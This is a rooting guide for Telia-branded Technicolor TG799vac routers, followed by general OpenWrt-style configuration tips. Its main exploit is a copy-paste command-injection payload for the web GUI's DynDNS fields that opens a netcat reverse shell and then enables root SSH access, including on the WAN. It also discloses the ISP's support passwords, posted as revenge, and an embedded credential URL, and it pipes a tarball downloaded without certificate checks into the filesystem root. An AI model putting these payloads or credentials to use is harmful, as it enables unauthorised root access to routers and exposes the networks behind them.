# FELIA

Website for this place can be found [here](https://wuseman.github.io/TG799VAC-XTREME-17.2-MINT/)

![Screenshot](files/felia1.jpg)

#### Edit 2020-12-21: Telia changed password, default password from now is: SUPP0r7!W1f1R0uT3r
   
## Very Important Notice 2019-11-15: 

It is possible to get root access on 17.2.405 version if you are using a MiTM attack, but its a mess so read below: 

If you have root access (telia still sending out devices with version 17.03) so the first thing you really must do is to edit the dropbear file on bank 2, otherwise you will be locked out when they pushing the firmware to 17.04 and then you are pretty lost unless you know how you can setup a MGMT network and gain root access this way. 

Also for disable  so your router wont get upgraded you can type below command ASAP you have connected to shell:
 
```sh
     uci set cwmpd.cwmpd_config.state=0
     uci commit
     rm /etc/cwmp*     
```

#### For get all info and settings from your device (Thanks to [@LuKePicci](https://github.com/LuKePicci) for this as well)

```sh
     clash
     root> get InternetGatewayDevice.
     InternetGatewayDevice.LANDeviceNumberOfEntries [unsignedInt] = 2
     InternetGatewayDevice.DeviceSummary [string] = InternetGatewayDevice:1.9[](Baseline:1, EthernetLAN:1, WiFiLAN:1, ADSLWAN:1,      EthernetWAN:1, Time:1, IPPing:1, TraceRoute:1, ATMLoopback:1, Download:1, DownloadTCP:1, Upload:1, UploadTCP:1, UDPEcho:1, UDPEchoPlus:1), VoiceService:1.0[1](SIPEndpoint:1, TAEndpoint:1)
     InternetGatewayDevice.WANDeviceNumberOfEntries [unsignedInt] = 2
     InternetGatewayDevice.UserNumberOfEntries [unsignedInt] = 4
     InternetGatewayDevice.Capabilities.PerformanceDiagnostic.DownloadTransports [string] = HTTP
     InternetGatewayDevice.Capabilities.PerformanceDiagnostic.UploadTransports [string] = HTTP
     InternetGatewayDevice.DeviceInfo.ProductClass [string] = TG799vn v2
     InternetGatewayDevice.DeviceInfo.VendorConfigFileNumberOfEntries [unsignedInt] = 1
     InternetGatewayDevice.DeviceInfo.X_000E50_SwitchtoPassiveBank [boolean] = 0
     InternetGatewayDevice.DeviceInfo.UpTime [unsignedInt] = 16583
     InternetGatewayDevice.DeviceInfo.ProvisioningCode [string] = 
     InternetGatewayDevice.DeviceInfo.X_000E50_SoftwareVersionPassiveBank [string] = 16.2.7732
     InternetGatewayDevice.DeviceInfo.ModelNumber [string] = TG799vn v2
     InternetGatewayDevice.DeviceInfo.X_000E50_RebootCause [string] = CWMP
     InternetGatewayDevice.DeviceInfo.AdditionalSoftwareVersion [string] = 7e33e895fd9205aade75cxxxa3b584310d496ac9e
     InternetGatewayDevice.DeviceInfo.HardwareVersion [string] = VDNT-O
     InternetGatewayDevice.DeviceInfo.ManufacturerOUI [string] = 9C9726
     InternetGatewayDevice.DeviceInfo.ModemFirmwareVersion [string] = A2pv6F039v2.d26d
     InternetGatewayDevice.DeviceInfo.X_000E50_BootloaderVersion [string] = 2.0.6
     InternetGatewayDevice.DeviceInfo.X_000E50_TotalHWReboot [unsignedInt] = 1
     InternetGatewayDevice.DeviceInfo.Manufacturer [string] = Technicolor
     InternetGatewayDevice.DeviceInfo.VendorLogFileNumberOfEntries [unsignedInt] = 0
     InternetGatewayDevice.DeviceInfo.SpecVersion [string] = 1.0
     InternetGatewayDevice.DeviceInfo.X_000E50_ReturnToFactoryDefaultsSoft [boolean] = 0
     InternetGatewayDevice.DeviceInfo.FirstUseDate [dateTime] = 0001-01-01T00:00:00Z
     InternetGatewayDevice.DeviceInfo.SerialNumber [string] = CP1352CS00G
     InternetGatewayDevice.DeviceInfo.DeviceLog [string] = ault route!
     InternetGatewayDevice.Services.VoiceService.2.X_000E50_HandsetUpgrade.NumberOfHandsetUpgradeURLEntries [unsignedInt] = 0
     InternetGatewayDevice.Services.X_000E50_DNSProxy.DNSRebindProtection [boolean] = 0
     InternetGatewayDevice.Services.X_000E50_DNSProxy.RebindDomain [string] = 
     InternetGatewayDevice.Services.X_000E50_Internet.WANConnection [string] = 
     InternetGatewayDevice.Services.X_000E50_Internet.DMZEnable [boolean] = 0
     InternetGatewayDevice.Services.X_000E50_KernelCrash.Upload [boolean] = 0
     InternetGatewayDevice.Services.X_000E50_KernelCrash.Action [string] = compress
     InternetGatewayDevice.Services.X_000E50_KernelCrash.URL [string] = https://internal-core.tgwfd.org:5443
     InternetGatewayDevice.Services.X_000E50_OSGI.Configuration.Enable [boolean] = 1
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.IPIntf [string] = 
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.User [string] = assist
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.Port [unsignedInt] = 60443
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.RandomPassword [boolean] = 1
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.Password [string] = 
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.Secure [boolean] = 1
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.Name [string] = remote
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.Status [string] = Inactive
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.Start [boolean] = 0
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.Mode [string] = Temporary
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.RandomPort [boolean] = 0
     InternetGatewayDevice.Services.X_000E50_RemoteAccess.1.URL [string] = 
     InternetGatewayDevice.Services.X_000E50_Telnet.Enable [boolean] = 
     InternetGatewayDevice.Services.X_000E50_ngwfdd.CoredumpURL [string] = https://telia-core.tgwfd.org:5443/
     InternetGatewayDevice.Services.X_000E50_ngwfdd.Enable [boolean] = 0
     InternetGatewayDevice.Services.X_000E50_Internet.WANConnection [string] = 
     InternetGatewayDevice.Services.X_000E50_ngwfdd.BaseURL [string] = https://telia:ZDgFbBH5jQvUocL7@telia-gw.tgwfd.org:8443/
     InternetGatewayDevice.Services.X_000E50_ngwfdd.Tag [string] = TeliaFT
    ........ 
 ```    
    
     Once type above command, wait for few seconds and you wil dump entire settings for your device.

Get CSFR token via cli: 
 ```sh
     curl -sL http://192.168.1.1/login.lp?action=getcsrf
```

Get CSFR token via developer console: 

```js
     $("meta[name=CSRFtoken]").attr("content")
```

#### Notice: This wiki is for firmwares <17.2.0405. For get root access on 17.2.0405 you must downgrade your firmware via TFTP flashing and then you can follow this wiki, more info about how to downgrade your firmware can be found on this awesome [wiki](https://hack-technicolor.readthedocs.io/en/stable/) - Thanks to all who contribute, you know who you are - _If you leeching the firmwares, then seed 24/7 for help others_

#### For know wich firmware you need, see [@LuKePicci](https://github.com/LuKePicci) comment [here](https://github.com/wuseman/TG799VAC-XTREME-17.2-MINT/issues/9#issuecomment-533571460) - I’m really grateful for your help here luke.

#### Telia - VANT-W firmwares can be downloaded from:

    http://94.242.57.127/archive/technicolor/firmware/VANT-W/172405w1441030closed.rbi
    http://94.242.57.127/archive/technicolor/firmware/VANT-W/172339w1441004closed.rbi
    http://94.242.57.127/archive/technicolor/firmware/VANT-W/172339w1441020closed.rbi
    http://94.242.57.127/archive/technicolor/firmware/VANT-W/1627732w2221002closed.rbi
    
#### Telia - VANT-R firmwares can also be downloaded from:

    http://94.242.57.127/archive/technicolor/firmware/VANT-R/172405r1021034closed.rbi
    http://94.242.57.127archive/technicolor/firmware/VANT-R/172339r1021022closed.rbi
    http://94.242.57.127/archive/technicolor/firmware/VANT-R/172339r1021008closed.rbi
    http://94.242.57.127/archive/technicolor/firmware/VANT-R/1627732r2221004closed.rbi
    http://94.242.57.127/archive/technicolor/firmware/VANT-R/15516436r1361008closed.rbi
    
#### Telia - VBNT-H firmwares can be downloaded from:

    http://94.242.57.127/archive/technicolor/firmware/VBNT-H/172405h1441028closed.rbi
    http://94.242.57.127/archive/technicolor/firmware/VBNT-H/172339h1441018closed.rbi
    http://94.242.57.127/archive/technicolor/firmware/VBNT-H/172339h1441002closed.rbi
    http://94.242.57.127/archive/technicolor/firmware/VBNT-H/1627732h2221002closed.rbi
    
#### Telia - VDNT-O firmwares can be downloaded from:

Commands must be executed on the router: 
```sh
    wget http://131.116.22.230:80/172339o1901024closed.rbi
    wget http://131.116.22.230:80/1720405o1901012closed.rbi
```

For upgrade firmware, you just have to type:

```sh
    sysupgrade --safe -o 172339o1901024closed.rbi
```

 #### Get access to all cards on latest firmware:

```sh 
    uci add_list web.uidefault.upgradefw_role=admin
    uci add_list web.usr_assist.role=admin
    uci add_list web.assistancemodal.roles=admin
    uci add_list web.usermgrmodal.roles=admin
    uci add_list web.todmodal.roles=admin
    uci add_list web.iproutesmodal.roles=admin
    uci add_list web.cwmpconf.roles=admin
    uci add_list web.relaymodal.roles=admin
    uci add_list web.systemmodal.roles=admin
    uci add_list web.natalghelper.roles=admin
    uci add_list web.xdsllowmodal.roles=admin
    uci add_list web.parentalblock.roles=admin
    uci add_list web.usr_intercept.role=admin
    uci add_list web.ltesms.roles=admin
    /etc/init.d/nginx restart
    sed -i 's/0/1/g' /etc/config/dropbear; sed -i 's/61122/22/g' /etc/config/dropbear; /etc/init.d/dropbear restart
```

##### Bonus from 2019-10-29. Since I have been blacklisted by Telia from getting new routers for free and they force me to pay full price if I want a new router I decided to share their secret password in plain-text. Telia's default password in plain-text is: '_T3L1a!SuPPor7' for all Technicolor routers - Enjoy!

#### If you want me host more firmwares just setup a FTP or something so I can leech them and I will host them for you, send an e-mail with info to wuseman@nr1.nu
     
# README

   Alright guys, i have bricked my old TG799VAC-XTREME when i figured out how to generate the access key so I just got my new TG799 VAC Xtreme2 with version 17.2 Mint, ofc i have hacked this one aswell since i DO not want backdoors in my network..

   I have not found any other tutorial how-to hack this version from technicolor in this way I have done it. Someone has to be the first on a new exploit and let everyone know what's really is an open door straight into your network and your digital life. This is    nothing people just should say things like "i do not care" cause this can really be abused if there is some blackhat hacker on the support or if someone just is curios about your life and has enough freetime . With TSHARK or 
   WSHARK they can sniff ALL your traffic no matter what ppl say since the router is the last point in 'almost' all home-networks. I exposing Telia again cause i see this as a REAL threat to our privacy...I had never questioned this if the providers had been straight and honest about what they actually 
   have access to. I will expose every setting, every ip and every key i can found until they will remove the backdoors. Now im bored so let's start i really hate to write descs and the faster you get this information, the faster you can protect yourself from the backdoors. 

#### FIRST SOME RLY SCARRY SHIT THAT USERS HAS NO KNOWLEDGE ABOUT AT ALL!!

#### The question is who has access to the logs from our router on the ip number you see in the picture below, why should they receive a lot of data from the router? They have gone so far so they storing logs when you start & restore the router, what are they doing with this data? This is really unpleasant and people really have no idea that things they do in their own home getting stored on a server in Stockholm / Telia. (whois the ip)

![Screenshot](files/wth.png)

# HOWTO GET ROOT ACCESS FROM WEBGUI:

## SHORT VERSION

![Screenshot](files/short-version.gif)

#### 1) Please wait 20-30 seconds before you trying to ssh into your router
#### 2) Connect to router: 'ssh root@192.168.1.1'
#### 3) Default password: root
#### 4) You have just hacked your router in 20 seconds. You also toke over root account from telia & technicolor devs.

##### Copy and paste all this stuff in dyndns field in webgui (edit ip): 

::::::;nc 192.168.1.144 1337 -e /bin/sh;rm /etc/dropbear/*;uci delete dropbear.mgmt &> /dev/null;uci delete dropbear.mgmt.PasswordAuth &> /dev/null;uci delete dropbear.mgmt.RootPasswordAuth &> /dev/null;uci delete dropbear.mgmt.Port &> /dev/null ;uci delete dropbear.mgmt.Interfac e&> /dev/null;uci delete dropbear.mgmt.AllowedClientIPs &> /dev/null;uci delete dropbear.mgmt.enable &> /dev/null;uci delete dropbear.mgmt.IdleTimeout &> /dev/null ;uci set dropbear.wan=dropbear;uci set dropbear.wan.PasswordAuth='off';uci set dropbear.wan.RootPasswordAuth='on';uci set dropbear.wan.Port='22';uci set dropbear.wan.Interface='wan';uci set dropbear.wan.AllowedClientIPs='wanip';uci set dropbear.wan.IdleTimeout='3600';uci set dropbear.wan.enable='1';uci set dropbear.lan=dropbear;uci set dropbear.lan.PasswordAuth='on';uci set dropbear.lan.RootPasswordAuth='on';uci set dropbear.lan.Interface='lan';uci set dropbear.lan.enable='1';uci set dropbear.lan.IdleTimeout='3600';uci set dropbear.lan.Port='22';uci set web.uidefault.nsplink='https://www.wuseman.com';uci set system.config.text='1';uci set system.config.export_unsigned='1';uci set system.config.import_plaintext='1';uci set system.config.import_unsigned='1';uci set clash.main_config=single_config;uci set clash.main_config.module_path='/usr/lib/lua/clash/modules';uci set clash.main_config.log_level='3';uci set clash.engineer=user;uci set clash.engineer.ssh='1';uci set clash.engineer.telnet='1';uci set clash.engineer.serial='1';uci set clash.engineer.ssh_key='wuseman@thinkpad';uci set web.uidefault.upgradefw_role='admin';/etc/init.d/dropbear restart; uci commit


## LONG VERSION:

![Screenshot](files/tg799vacv2.gif)

#### Let's begin. Fire up a terminal of any kind and just run the awesome netcat tool and listen on a port:

```sh
    nc -lvvp [machine_port]
```

#### Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand.

```sh
    :::::::`nc [machine_IP] [machine_port] -e /bin/sh`
```

##### You will see something similiar and if you see this then you got root access, type ls / for example:

    listening on [any] 1337 ...
    connect to [192.168.1.144] from router [192.168.1.1] 40980

#### Let us now allow SSH permanent, copy paste commands below:

```sh
    rm /etc/dropbear/*
    uci delete dropbear.mgmt &> /dev/null
    uci delete dropbear.mgmt.PasswordAuth &> /dev/null
    uci delete dropbear.mgmt.RootPasswordAuth &> /dev/null
    uci delete dropbear.mgmt.Port &> /dev/null
    uci delete dropbear.mgmt.Interfac e&> /dev/null
    uci delete dropbear.mgmt.AllowedClientIPs &> /dev/null
    uci delete dropbear.mgmt.enable &> /dev/null
    uci delete dropbear.mgmt.IdleTimeout &> /dev/null
    uci set dropbear.wan=dropbear
    uci set dropbear.wan.PasswordAuth='off'
    uci set dropbear.wan.RootPasswordAuth='on'
    uci set dropbear.wan.Port='22'
    uci set ropbear.wan.Interface='wan'
    uci set dropbear.wan.AllowedClientIPs='wanip'
    uci set dropbear.wan.IdleTimeout='3600'
    uci set dropbear.wan.enable='1'
    uci set dropbear.lan=dropbear
    uci set ropbear.lan.PasswordAuth='on'
    uci set dropbear.lan.RootPasswordAuth='on'
    uci set dropbear.lan.Interface='lan'
    uci set dropbear.lan.enable='1'
    uci set dropbear.lan.IdleTimeout='3600'
    uci set dropbear.lan.Port='22'
    uci set web.uidefault.nsplink='https://www.wuseman.com'
    uci set system.config.export_plaintext='1'
    uci set system.config.export_unsigned='1'
    uci set system.config.import_plaintext='1'
    uci set system.config.import_unsigned='1'
    uci set clash.main_config=single_config
    uci set clash.main_config.module_path='/usr/lib/lua/clash/modules'
    uci set clash.main_config.log_level='3'
    uci set clash.engineer=user
    uci set clash.engineer.ssh='1'
    uci set clash.engineer.telnet='1'
    uci set clash.engineer.serial='1'
    uci set clash.engineer.ssh_key='wuseman'
    uci set web.uidefault.upgradefw_role='admin'
    /etc/init.d/dropbear restart; uci commit; exit
    ssh root@192.168.1.1 "tee -a /etc/dropbear/authorized_keys" < ~/.ssh/id_rsa.pub; ssh root@192.168.1.1
```

#### When things gets broken for real as for example there is no space left and you can't even use rm -rf command then mtd will save you, run below command for a full factory reset:

![Screenshot](files/erase-rootfs.gif)
```sh
    mtd -r erase rootfs_data
```

#### If WEBGUI ever will get broken cause you fucked it up then reset router with 'rtfd --all (same as press on reset button)'. If you want to keep files and just reset settings then use 'rtfd --soft' instead.

![Screenshot](files/reset-router-with-rtfd-if-webgui-crashed.gif)

#### Banner (our internet providers have given us an firmware with absolutely minimal features, fuck you!!)

![Screenshot](files/webgui_default.png)

#### Banner(Default)

![Screenshot](files/banner_before_default.png)

#### When you have root access on your router you will be able to unlock rootfs_data and install a very powerful gui vs original from Telia thanks to Ansuel and other awesoem developers by below command:

```sh
    curl -k https://repository.ilpuntotecnico.com/files/Ansuel/AGTEF/GUI.tar.bz2 --output /tmp/GUI.tar.bz2; bzcat /tmp/GUI.tar.bz2 | tar -C / -xvf -; /etc/init.d/rootdevice force; reboot
```

##### Now go visit http://192.168.1.1 and you will see a brand new GUI interface. Default login: username: admin - password:admin

#### This is how it will look a like after you run the above command:

![Screenshot](files/login-screen-after-root.png)

#### Stats view:

![Screenshot](files/stats-view.gif)

#### Telstra Extension:

![Screenshot](files/telstra-gui.png)

#### This is an example for default setup with more lua cards:

![Screenhot](files/telia_added_few_features.png)

#### Luci is another thing you will be able to install - Not supported in above package yet:

![Screenshot](files/wusemans_pwnS-100-percent-complete-hacking.png)

Do you look forward to upgrade your firmware without any third party software or without any backdoors from your internet provider? Great, i will show you how you will do this easier then ever..

#### Add Administrator user to be allowed to upgrade firmwware:
```sh
    uci add_list web.uidefault.upgradefw_role='admin'
    uci commit
```
#### If you will try below command you will know how it feels to work for telia a support: ;)

![Screenshot](files/wuseman.pwned.telia.png)
```sh
    uci set web.usr_Administrator.role='superuser'
    uci set web.usr_Administrator.role='telia'
```

![Screenshot](files/upgrade_firmware.png)

#### Add your own user without any extra tools:

![Screenshot](files/adduser.gif)

#### Add a new user with clash:

![screenshot](files/clash-adduser.gif)
```sh
    clash newsrpuser -u <wuseman> -p <password>

     uci set web_back.usr_wuseman.srp_salt='D0124225'
     uci add web_back.default.users='usr_wuseman'
     uci add web_back.uidefault.defaultuser='wuseman'
     uci add web_back.usr_wuseman=user
     uci set web_back.usr_wuseman.name='wuseman'
     uci set web_back.usr_wuseman.role='wuseman'
     uci set web_back.usr_wuseman.gak_id='1'

     echo "
     config user 'usr_wuseman'
     option name 'wuseman'
     option password_reminder '0'
     option srp_verifier 'A955EDB6ECAC0536BA69F9D1F1C7F3D9F8A02FDF29170D4A8506A14F7E6F752FF845DACE10E6B3C66C15EAAB53896E41D541C22F32E9E0E8D60A1D7F1D187604BE8A5653B5CDF327542E8DBE5C8481E40C70BD0506448695F7E85338D4427187A49CF799CDDDD2DB3E6D652A25830C42024EB9A682ED5C27E36B159DB7617F41FF6ED5EF58163AC2C68AC26B3D57749AF3AFEF6352950D79A410150E27CE984EA375613737A235B5E28D006C5CE69DE40B651020505AEB7CE5986829D79B9E0375F5127F090CD400B2A2D06385F9931071415042979C8ED80D328BA4810A1692E263733DA9D85DC7E762859145A0D6A607447FCF4FFD53D144D8E018D4F345C9'
     option srp_salt 'D0124225'
     " >> /etc/config/web
```

#### Create a user for minitrr064d
```sh
     computeHA1 -u <username> -p <password> -r
     Self test passed - HA1 computation reliable
     Self test passed - authentication check reliable

     Computing hash for <username>:minitr064d:<password>
     dba1af121349128daf864727a33b1614
```
### OPENVPN Client

##### Install Required Packages:

```sh
     opkg update; 
     opkg install openvpn-openssl openssl-util
```
##### Configs - Network:

```sh
    uci set network.vpnclient="interface"
    uci set network.vpnclient.ifname="tun0"
    uci set network.vpnclient.proto="none"
    uci commit network;service network restart
```
##### Configs - Firewall:

```sh
     uci add firewall zone
     uci set firewall.@zone[-1].name="<vpn_client>"
     uci add_list firewall.@zone[-1].network="<vpn_client>"
     uci set firewall.@zone[-1].input="REJECT"
     uci set firewall.@zone[-1].output="ACCEPT"
     uci set firewall.@zone[-1].forward="REJECT"
     uci set firewall.@zone[-1].masq="​1"​
     uci set firewall.@zone[-1].mtu_fix="1"
     uci add firewall forwarding
     uci set firewall.@forwarding[-1].src="lan"
     uci set firewall.@forwarding[-1].dest="<vpn_client>"
     uci commit firewall; service firewall restart
```
#### Setup openvpn client:

```sh
     uci set openvpn.vpnclient="openvpn"
     uci set openvpn.vpnclient.enabled="1"
     uci set openvpn.vpnclient.config="/etc/openvpn/vpnclient.ovpn"
     uci commit openvpn;service openvpn restart
```
#### OPKG

##### With below setting you will be allowed to install packages from more repos:

```sh
cat << "EOF" > /etc/opkg.conf 
arch all 1
arch noarch 1
arch brcm63xx 3
arch brcm63xx-tch 10
EOF
```

```sh
cat << "EOF" >> /etc/opkg/distfeeds.conf
src/gz chaos_calmer http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/base
src/gz luci http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/luci
src/gz management http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/management
src/gz routing http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/routing
src/gz packages http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/packages
src/gz telephony http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/telephony
EOF
```
#### Enable TFTP and flash your device with TFTP:

    Set tftp enable 
```sh
      uci set dhcp.dnsmasq.enable_tftp='1'
```
    Switch device power off (or pull the power cord).
    Connect a client to the device via Ethernet to LAN1
    Trigger the rescue function by pressing and holding the reset button of the device and then turning the device on (or plug in the power cord).
    You can release the reset button after a few seconds.
    The device will take ~15-20 seconds to boot a mini-web server, that provides only a single function: it can upload a firmware file and has a button to trigger the flash process. The web-server will usually be available under either (if in doubt, try both)
    http://192.168.1.1

#### Setup a TFTP server on your Gentoo Linux pc:

    Install atftpd: 
```sh
     emerge --sync; emerge -a atftpd
     mkdir /mnt/tftp
     cp <firmware.bin> /mnt/tftp/
     chown nobody:nogroup -R /mnt/tftp
```
```sh
     echo 'TFTPD_ROOT="/mnt/tftp"
           TFTPD_OPTS="--daemon --user nobody --group nobody' > /etc/conf.d/atftp
     /etc/init.d/atftpd start
```

    Thats it, now use getent to confirm it is up and running:
```sh
      getent services tftp
```
#### Use TFTP to push firmware to tg799vac router:
```sh
    First you need to setup a static ip to be able to communicate with router:
     ifconfig eth0 192.168.1.2 netmask 255.255.255.0 up 
     route add default gw 192.168.1.1
     echo "nameserver 192.168.1.1" > /etc/resolv.conf

    Use wireshark for listen on BOOTP message, when tg799 router reporting BOOTP then run below command: 
    atftp --trace --option "timeout 1" --option "mode octet" --put --local-file tg799bin.firmware.rbi <ip-addr/hostname>
```
#### Got stuck with some packages that says error opening terminal? No worries - This is caused cause colors - Run below command to fix the xterm problem:

![Screenshot](files/install-opkg-packages.gif)
```sh
    export TERM=linux
    export TERMINFO=/etc/terminfo
```
#### Run uci-whois.sh from scripts dir to whois all ip's that your isp added for various settings:

![Screenshot](files/whois.gif)

#### Mount root as read and write:
```sh
    mount -o remount,rw /
```
##### If you are lazy and want things sorted as i do, then run below command:

![Screenshot](files/sorted-dirs.gif)
```sh
    mkdir uci_settings; cd uci_settings;
    for settings in $(uci show | awk -F. '{print $1}' | uniq);do uci show $settings > $settings;done
```

#### List product, serial, ssid prefix etc;
```sh
cat /var/hostapd.env 
_COMPANY_NAME=Technicolor
_PROD_NAME=MediaAccess TG
_PROD_NUMBER=Telia WiFi-router Plus
_PROD_FRIENDLY_NAME=Telia WiFi-router Plus
_VARIANT_FRIENDLY_NAME=TG799TSvac Xtream
_SSID_SERIAL_PREFIX=TNCAP
_BOARD_NAME=VANT-W
_BOARD_SERIAL_NBR=1652TAGSU
_PROD_SERIAL_NBR=CP1652TAGSU
_MACADDR=10-13-31-1D-AA-3A
_WL_MACADDR=10-13-31-1D-AA-3B

```

#### List all files where "password=" is readable:

```sh
    sudo grep -rP -w -e 'password=' .| grep -Ev 'Binary|ddns'
```

#### List all files where you can find your serial:
```sh
    find . -type f | xargs grep -e 'SERIAL' | cut -d':' -f1 | grep / | uniq
```

#### Some guys on openwrt forum claims that your webgui will be faster if you change some power settings:

```sh
    pwrctl config --cpuspeed 0
    pwrctl config --wait off
    pwrctl config --ethapd off
    pwrctl config --eee off
    pwrctl config --autogreeen off
```
#### Change telia to admin in all lp files:

![Screenshot](files/beforeandafter.png)

```sh
    sed -i 's/telia/admin/' /www/docroot/modals/gateway-modal.lp
    sed -i 's/telia/admin/' /www/docroot/modals/internet-modal.lp
    sed -i 's/telia/admin/' /www/docroot/modals/mmpbx-global-modal.lp
```
#### For users that miss vpn card in webgui, run below command (if this modal is missing then its under modals dir in this repo)

![Screenshot](files/vpn-in-webgui.png)

```sh
    cp /rom/www/docroot/modals/l2tp-ipsec-server-modal.lp /www/docroot/modals/

    cat >> /etc/config/web

    list rules 'l2tpipsecservermodal'
    config rule 'l2tpipsecservermodal'
    option target '/modals/l2tp-ipsec-server-modal.lp'
    list roles 'admin'
    list roles 'engineer'
```
#### Setup your dns provider from commandline:

```sh
cat << "EOF"  > /etc/config/ddns 
    config service 'myddns_ipv4'
    option interface 'wan'
    option ip_source 'network'
    option ip_network 'wan'
    option use_https '1'
    option cacert 'IGNORE'
    option force_interval '36500'
    option force_unit 'days'
    option enabled '1'
    option password 'password'
    option username 'domain.com'
    option service_name 'loopia.se'
    option lookup_host 'domain.com'
    option domain 'domain.com'"
EOF
 ```   

#### Setup domain names:

##### Example 1 - Echo method
```sh
    echo "
    config domain
    option name 'github'
    option ip '192.30.253.112'" >> /etc/config/dhcp
```
##### Example 2 - UCI method
```sh
    uci set dhcp.@domain[1]=domain
    uci set dhcp.@domain[1].name='github'
    uci set dhcp.@domain[1].ip='192.30.253.112'
```
#### Portforwarding

##### Example 1 - Echo method
```sh
cat << "EOF" > /etc/config/firewall

    config userredirect 'userredirectXXDD'
    option dest_port '<PORTNUMBER>'
    option dest 'lan'
    option src 'wan'
    list proto '<tcp>/<udp>/<tcpudp>'
    option enabled '<1>/<0>'
    option name 'CUSTOMNAMEINWEBINTERFACE'
    option src_dport '<PORTNUMBER>'
    option family '<ipv4>/<ipv6>'
    option target 'DNAT'
    option dest_ip '<lanip>'"
EOF
```

##### Example 2 - UCI method

```sh
    uci set firewall.userredirect4320=userredirect
    uci set firewall.userredirect4320.family='<ipv4/ipv6>'
    uci set firewall.userredirect4320.enabled='<1>'
    uci set firewall.userredirect4320.target='DNAT'
    uci set firewall.userredirect4320.src='<wan>'
    uci set firewall.userredirect4320.dest='<lan>'
    uci set firewall.userredirect4320.dest_port='<port>'
    uci set firewall.userredirect4320.name='nameyourforwarding'
    uci set firewall.userredirect4320.src_dport='<port>'
    uci set firewall.userredirect4320.dest_ip='<0.0.0.0>' # use 0.0.0.0 if you dont use static leases
    uci set firewall.userredirect4320.dest_mac='<macaddr>'
    uci set firewall.userredirect4320.proto='tcp' '<tcp/udp>'
```
#### Disable UPNP:

```sh
    uci set minitr064d.config=minitr064d
    uci set minitr064d.config.enable_upnp='0'
    uci set minitr064d.config.log_output='0'
    uci set minitr064d.config.internal_iface='lan'
    uci set minitr064d.config.port='0'
    uci set minitr064d.config.manufacturer_url=''
    uci set minitr064d.config.model_url=''
    uci set minitr064d.config.model_description='main router'
    uci set minitr064d.config.model_number='tg799vac xtream router'
    uci set minitr064d.config.friendly_name='tg799vac xtream router'
    uci set minitr064d.config.manufacturer_name='tg799vac xtream router'
    uci set minitr064d.config.model_name='technicolor'
```

#### Environment settings:

```sh
    uci set env.var.aria2_webui='0'
    uci set env.var.luci_webui='0'
    uci set env.var.transmission_webui='0'
    uci set env.var.xupnp_app='0'
    uci set env.var.blacklist_app='0'
    uci set env.var.new_ver='only god knows'
    uci set env.rip.sfp='1'
```

##### List all URLs for your firmware that can be downloaded (wont work on telias firmware. Did you found the key? Please contact me then):

```sh
    strings /etc/cwmpd.db
    SQLite format 3
    tabletidkvtidkv
    CREATE TABLE tidkv (  type TEXT NOT NULL,  id TEXT NOT NULL,  key TEXT NOT NULL,  value TEXT,  PRIMARY KEY (type, id, key)))
    indexsqlite_autoindex_tidkv_1tidkv
    transferPassword5
    transfer Username
    Stransfer URLhttp://192.168.21.52:7547/ACS-server
    5transferaStartTime2018-08-19T15:20:13Z
    transfera FaultStringcomplete
    transfera FaultCode0M_
    M%5transfera CompleteTime2018-08-19T15:19:57Z
    'transfera TimeStamp244,9XXXXXX
    transfera DelaySeconds3
    transfera Password
    transfera Username
    runtimevarParameterKey#
    runtimevarConfigurationVersionD
    %_runtimevarBootStrappedhttps://acs.telia.com:7575/ACS-server/ACS-
     +/VersionsSoftwareVersion16.2.XXXXXX
    transfer FaultString
    transfer FaultCode
    transfer TimeSt6
    transfera UsernameU
    transfera URLT7
    transfera TimeStampX
    transfera SubStatec
    transfera Stateb7
    transfera StartTimed
    transfera PasswordV
```

#### List network devices:

```sh
    awk '{print $1}' /proc/net/dev
```

#### To get a fresh network configuration on your client system you can remove all IP addresses via:

```sh
      ip a flush dev <device>
```

#### Changing max sync speed on your modem:

```sh
    uci set xdsl.dsl0.maxaggrdatarate='200000' # 16000 default
    uci set xdsl.dsl0.maxdsdatarate='140000'   # 11000 default
    uci set xdsl.dsl0.maxusdatarate='60000'    # 40000 default
```
#### Enable or Disable dnsmasq:

```sh
    uci show dhcp.lan.ignore='1'
```
#### Enable or Disable network time server:

```sh
    uci set system.ntp.enable_server='1'
```

#### Check the current running dns with:

```sh
    cat /etc/resolv.conf
```
#### Edit nsplink to something else (where you get redirected when you click on the logo at top)

```sh
    uci set web.uidefault.nsplink='https://sendit.nu'
```
#### This will show all traffic on your router with netstat:

```sh
    netstat -tulnp
```
#### This will show all ip numbers connected to your router atm..

```sh
    netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u
```
#### Capture traffic on all interfaces (add -i wl0 for include wifi):

```sh
    tcpdump -vvv -ttt -p -U
    tcpdump -i wl0 -vvv -ttt -p -U
```
#### Enable or Disable Content Sharing (Samba / DNLA)

```sh
    uci set samba.samba.enabled='1'
   
    uci set dlnad.config.enabled='1'

```
#### Take control over mwan:

```sh
    uci set mwan.remoteassist=rule
    uci set mwan.remoteassist.dest_ip='192.168.1.0/24'
    uci set mwan.remoteassist.policy=''
```
#### To view currently dhcp leases:

```sh
    cat /tmp/dhcp.leases
```

#### To view all ipv4 adresses from uci settings:

```sh
    uci show | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
```
#### Print CPU info with clash:

    clash showinfo cpu

     Processor     : ARMv7 Processor rev 1 (v7l)
     processor     : 0
     BogoMIPS    : 1990.65

